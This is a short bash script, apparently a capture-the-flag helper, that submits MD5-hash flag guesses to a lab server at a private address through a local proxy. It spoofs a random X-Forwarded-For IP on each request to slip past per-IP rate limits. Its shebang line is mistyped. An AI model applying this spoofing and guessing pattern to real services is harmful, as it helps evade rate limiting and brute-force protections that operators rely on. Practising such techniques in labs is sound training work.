#1/bin/bash

getHash(){
	echo $1 | md5sum - | cut -d' ' -f1
}

getRandomIp(){
	echo "$((1 + $RANDOM % 256)).$(($RANDOM % 256)).$(($RANDOM % 256)).$(($RANDOM % 256))"
}

testFlag(){
	local test="$1"
	local ip=$(getRandomIp)
	local proxy="127.0.0.1:8080"
	url="http://10.1.90.89:5000/submit?flag%7B$test%7D"
	
	curl -x "$proxy" -H "X-Forwarded-For: $ip" $url 2>/dev/null
}

hash=$(getHash $1)
if [ $(testFlag $hash | grep -icv "Not Quite!") -eq 1 ]; then
	echo "flag{$hash}"
fi
